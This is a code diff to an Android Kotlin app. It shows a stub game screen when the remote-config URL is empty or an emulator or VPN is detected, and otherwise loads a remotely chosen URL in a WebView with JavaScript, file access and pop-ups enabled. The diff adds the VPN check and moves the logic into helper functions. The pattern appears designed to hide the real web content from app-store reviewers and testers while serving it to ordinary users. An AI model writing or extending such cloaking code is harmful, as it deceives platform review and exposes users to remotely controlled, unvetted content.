@@ -49,6 +49,9 @@ class MainActivity : AppCompatActivity() {
       //
         val remoteString: String = loadRemoteString(context = this)
         if (remoteString == "") {
+            try {
+
+
             val remoteConfig = FirebaseRemoteConfig.getInstance()
             val config: FirebaseRemoteConfigSettings = FirebaseRemoteConfigSettings.Builder()
                 .setMinimumFetchIntervalInSeconds(3600).build()
@@ -56,99 +59,109 @@ class MainActivity : AppCompatActivity() {
             remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
                 if (task.isSuccessful) {
                     val result = remoteConfig.getString("url")
+                    val vpnBool = remoteConfig.getBoolean("to")
 
-                    if (result == "" || checkIsEmu()) {
-                        //code game paste your code
-                        setContentView(R.layout.activity_main)
-                        resultButton = findViewById(R.id.result_button)
-                        resultButton.setOnClickListener{view ->
-                            val intent = Intent(this, ResultActivity::class.java)
-                            //add information in intent
-                            //intent.putExtra("SOMEVALUE", 0)
-                            startActivity(intent)
-                            finish()
+                    if (vpnBool) {
+                        if (result == "" || checkIsEmu() || vpnActive(context = this)) {
+                            //game view
+                            codeGame(savedInstanceState = savedInstanceState)
+
+                        } else {
+                            //code webview
+                            val remoteString = remoteConfig.getString("url")
+                            saveRemoteString(this, remoteString)
+
+                            viewWebActivity(
+                                savedInstanceState = savedInstanceState,
+                                remoteString = remoteString
+                            )
+
+
                         }
 
-
                     } else {
-                        //code webview
                         val remoteString = remoteConfig.getString("url")
-                        saveRemoteString(this, remoteString)
-
-                        setContentView(R.layout.web_view_activity)
-
-                        webView = findViewById(R.id.webView) as WebView
-                        webView!!.webViewClient = WebViewClient()
-                        webView!!.webChromeClient = ChromeClient()
-                        var webSettings = webView?.settings
-                        webSettings?.javaScriptEnabled = true
-                        webSettings?.loadWithOverviewMode = true
-                        webSettings?.useWideViewPort = true
-                        webSettings?.domStorageEnabled = true
-                        webSettings?.databaseEnabled = true
-                        webSettings?.setSupportZoom(false)
-                        webSettings?.allowFileAccess = true
-                        webSettings?.allowContentAccess = true
-                        webSettings?.loadWithOverviewMode = true
-                        webSettings?.useWideViewPort = true
-
-
-                        webSettings?.javaScriptCanOpenWindowsAutomatically = true
-
-
-                        if (savedInstanceState != null) {
-                            webView?.restoreState(savedInstanceState)
-                        } else webView?.loadUrl(remoteString)
-
-                        val cookieManager = CookieManager.getInstance()
-                        cookieManager.setAcceptCookie(true)
-
+                        if (remoteString.isEmpty() || checkIsEmu()) {
+                            //game view
+                            codeGame(savedInstanceState = savedInstanceState)
+                        } else {
+                            saveRemoteString(this, remoteString)
+                            viewWebActivity(
+                                savedInstanceState = savedInstanceState,
+                                remoteString = remoteString
+                            )
+                        }
 
                     }
 
-                    }
+
+                }
+            }
+                    } catch (e: Error){
+                        noInternetActivity()
                     }
                 } else{
 
             if(isOnline()){
-
-
-                setContentView(R.layout.web_view_activity)
-                webView = findViewById(R.id.webView)
-                webView?.webViewClient= WebViewClient()
-                webView!!.webChromeClient = ChromeClient()
-                var webSettings = webView?.settings
-                webSettings?.javaScriptEnabled = true
-                webSettings?.loadWithOverviewMode =true
-                webSettings?.useWideViewPort =true
-                webSettings?.domStorageEnabled =true
-                webSettings?.databaseEnabled = true
-                webSettings?.setSupportZoom(false)
-                webSettings?.allowFileAccess = true
-                webSettings?.allowContentAccess = true
-                webSettings?.loadWithOverviewMode =true
-                webSettings?.useWideViewPort =true
-
-
-
-
-                webSettings?.javaScriptCanOpenWindowsAutomatically =true
-
-                if( savedInstanceState != null){
-                    webView?.restoreState(savedInstanceState)
-                } else webView?.loadUrl(remoteString)
-
-                val cookieManager = CookieManager.getInstance()
-                cookieManager.setAcceptCookie(true)
-
+                //code webview
+                viewWebActivity(savedInstanceState= savedInstanceState, remoteString = remoteString)
 
             }else{
-                setContentView(R.layout.no_internet_activity)
+              noInternetActivity()
             }
 
                 }
     }
 
+
+    fun codeGame(savedInstanceState: Bundle?){
+        //code game paste your code
+        setContentView(R.layout.activity_main)
+        resultButton = findViewById(R.id.result_button)
+        resultButton.setOnClickListener{view ->
+            val intent = Intent(this, ResultActivity::class.java)
+            //add information in intent
+            //intent.putExtra("SOMEVALUE", 0)
+            startActivity(intent)
+            finish()
+        }
+    }
+    fun viewWebActivity(savedInstanceState: Bundle?, remoteString: String){
+
+        setContentView(R.layout.web_view_activity)
+        webView = findViewById(R.id.webView)
+        webView?.webViewClient= WebViewClient()
+        webView!!.webChromeClient = ChromeClient()
+        var webSettings = webView?.settings
+        webSettings?.javaScriptEnabled = true
+        webSettings?.loadWithOverviewMode =true
+        webSettings?.useWideViewPort =true
+        webSettings?.domStorageEnabled =true
+        webSettings?.databaseEnabled = true
+        webSettings?.setSupportZoom(false)
+        webSettings?.allowFileAccess = true
+        webSettings?.allowContentAccess = true
+        webSettings?.loadWithOverviewMode =true
+        webSettings?.useWideViewPort =true
+
+
+
+
+        webSettings?.javaScriptCanOpenWindowsAutomatically =true
+
+        if( savedInstanceState != null){
+            webView?.restoreState(savedInstanceState)
+        } else webView?.loadUrl(remoteString)
+
+        val cookieManager = CookieManager.getInstance()
+        cookieManager.setAcceptCookie(true)
+
+
+
+    }
+    fun noInternetActivity(){
+        setContentView(R.layout.no_internet_activity)
+    }
     override fun onSaveInstanceState(outState: Bundle) {
 
         super.onSaveInstanceState(outState)
@@ -404,6 +417,28 @@ class MainActivity : AppCompatActivity() {
     companion object {
         private const val INPUT_FILE_REQUEST_CODE = 1
         private const val FILECHOOSER_RESULTCODE = 1
+    }
+
+    fun vpnActive(context: Context): Boolean {
+        //this method doesn't work below API 21
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return false
+        var vpnInUse = false
+        val connectivityManager =
+            context.getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            val activeNetwork = connectivityManager.activeNetwork
+            val caps = connectivityManager.getNetworkCapabilities(activeNetwork)
+            return caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)
+        }
+        val networks = connectivityManager.allNetworks
+        for (i in networks.indices) {
+            val caps = connectivityManager.getNetworkCapabilities(networks[i])
+            if (caps!!.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
+                vpnInUse = true
+                break
+            }
+        }
+        return vpnInUse
     }
 }
 
